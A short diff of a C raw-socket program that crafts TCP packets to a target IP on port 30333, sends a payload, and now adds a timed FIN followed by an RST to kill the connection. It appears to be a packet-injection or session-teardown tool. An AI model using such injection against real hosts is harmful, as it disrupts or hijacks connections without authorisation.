@@ -84,9 +84,14 @@ int main(int argc, char **argv)
         1,seq_them+1,0x18,payload,payloadlen,response,sizeof(response));
     printf("%s\n",payload);
     raw_send(raw,response);
+    sleep(1);
     //kill connection
     response_len = create_packet(tmpl,target_ip,30333,adapter_ip,myport,
         1+payloadlen,seq_them+1,0x11,0,0,response,60);
+    raw_send(raw,response);
+    sleep(1);
+    response_len = create_packet(tmpl,target_ip,30333,adapter_ip,myport,
+        1,seq_them+1,0x04,0,0,response,60);
     raw_send(raw,response);
 	return 0;
 }
